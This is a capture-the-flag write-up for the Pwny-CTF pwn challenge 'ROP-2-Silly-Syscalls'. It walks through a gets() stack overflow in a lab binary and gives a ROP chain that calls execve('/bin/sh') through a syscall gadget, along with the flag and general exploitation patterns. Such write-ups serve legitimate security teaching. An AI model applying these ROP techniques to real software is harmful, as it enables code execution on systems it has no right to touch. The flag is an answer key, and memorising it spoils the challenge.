---
title: "ROP-2-Silly-Syscalls"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "Not specified"
points: 400
techniques: ["ret2libc", "rop", "ret2win", "seccomp", "stack-canary", "pie-bypass", "nx-bypass"]
tools: ["checksec", "netcat", "python"]
keywords: ["ROP-2-Silly-Syscalls", "Pwny-CTF", "pwn", "ret2libc", "rop", "ret2win", "seccomp", "stack-canary", "pie-bypass", "nx-bypass", "checksec", "netcat", "python", "elf", "libc", "canary"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/Pwn/ROP-2-Silly-Syscalls/notes.md"
---

# ROP-2-Silly-Syscalls (Pwny-CTF, pwn)

## Summary
Challenge **ROP-2-Silly-Syscalls** from the Pwny-CTF CTF, pwn category. Main technique: ret2libc. Recognize: "no more win function", No PIE binary which contains "/bin/sh" and a syscall gadget -> ret2syscall execve. More direct than ret2libc: no leak necessary (everything is hard in the binary).

## Statement and artefacts
`nc chal.sigpwny.com 1393`

No more win function this time! How will you get the flag now...

**Author**: Akhil

- `main`: `char* random_string = "/bin/sh";` (literal → **in binary**,.rodata) + `char data[32]` + **`gets(data)`** → unlimited BOF.
- **No `win` function** (unlike ret2win) → nothing to “skip”, you have to make a call.
- Protections: **No PIE** (all fixed address), **No canary**, **NX**, Partial RELRO.

**Provided files / artifacts:**
- `work/Dockerfile (file, 397 B)`
- `work/chal (file, 19.1 KB)`
- `work/chal_patched (file, 19.1 KB)`

## Recognition signals
- If "/bin/sh" was NOT in the binary: write it yourself in.bss (read/pop) or use libc. Here it is offered.
- Signal: ROP family: ret2win -> ret2syscall -> ret2libc -> ORW (if seccomp blocks execve). Same brick: fill the registers via pop, trigger.

## Resolution method
1. **Recon** — `checksec` (No PIE/No canary/NX), source: `gets` = BOF, and a literal `"/bin/sh"` present.
2. **Offset** — `cyclic` → **56** bytes until the saved RIP (same layout as ret2win v1).
3. **Hardware (all in binary, No PIE)**:

```python
   rop = ROP(elf)
   pop_rdi/pop_rsi/pop_rdx/pop_rax = rop.find_gadget(['pop rXX','ret'])[0]
   syscall    = next(elf.search(asm("syscall ; ret")))   # syscall gadget
   bin_sh_elf = next(elf.search(b"/bin/sh\x00"))          # the channel, fixed address
   ```

4. **Execve string** — syscall `execve` = **#59**; `rdi`=path, `rsi`=argv, `rdx`=envp.

```python
   chain = flat(pop_rdi, bin_sh_elf, pop_rsi, 0, pop_rdx, 0, pop_rax, 59, syscall)
   payload = cyclic(56) + chain
   sla(b"data: ", payload)   #-> execve("/bin/sh", NULL, NULL) -> shell
   ```

5. `cat flag.txt`.

## Solve script
Script path: [scripts/pwny.py](scripts/pwny.py)

## Flag
sigpwny{execvez_pz}

## Lessons and reusable patterns
- Recognize: "no more win function", No PIE binary which contains "/bin/sh" and a syscall gadget -> ret2syscall execve. More direct than ret2libc: no leak necessary (everything is hard in the binary).
- execve via syscall: rax=59, rdi=&"/bin/sh", rsi=0 (argv NULL ok), rdx=0 (envp NULL ok), then syscall.
- argv/envp to NULL is enough to launch /bin/sh.
- If "/bin/sh" was NOT in the binary: write it yourself in.bss (read/pop) or use libc. Here it is offered.
- No need for alignment ret: syscall does not use movaps (unlike calling system/puts).
- ROP family: ret2win -> ret2syscall -> ret2libc -> ORW (if seccomp blocks execve). Same brick: fill the registers via pop, trigger.
